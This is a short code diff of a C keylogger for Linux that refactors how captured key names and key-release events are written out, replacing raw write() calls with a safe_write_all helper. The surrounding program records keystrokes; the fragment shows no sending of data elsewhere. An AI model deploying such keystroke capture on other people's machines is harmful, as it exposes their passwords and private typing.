@@ -84,7 +84,6 @@ const char *keycodes[] = {
   "SCROLLLOCK"
 };
 
-
 int loop = 1;
 
 void sigint_handler(int sig){
@@ -156,17 +155,16 @@ void keylogger(int keyboard, int writeout, bool releasedKeys){
 	    safe_write_all(writeout, keycodes[events[i].code], keyboard);
 	    safe_write_all(writeout, "\n", keyboard);
 	  } else {
-	    write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
+	    safe_write_all(writeout, "UNRECOGNIZED\n", keyboard);
 	  }
 	}
 	if (releasedKeys) {
 	  if(events[i].value == 0) {
 	    if(events[i].code > 0 && events[i].code < NUM_KEYCODES) {
 	      safe_write_all(writeout, keycodes[events[i].code], keyboard);
-	      write(writeout, " - up", sizeof(" - up"));
-	      safe_write_all(writeout, "\n", keyboard);
+	      safe_write_all(writeout, " - up\n", keyboard);
 	    } else {
-	      write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
+	      safe_write_all(writeout, "UNRECOGNIZED\n", keyboard);
 	    } 
 	  }
 	}
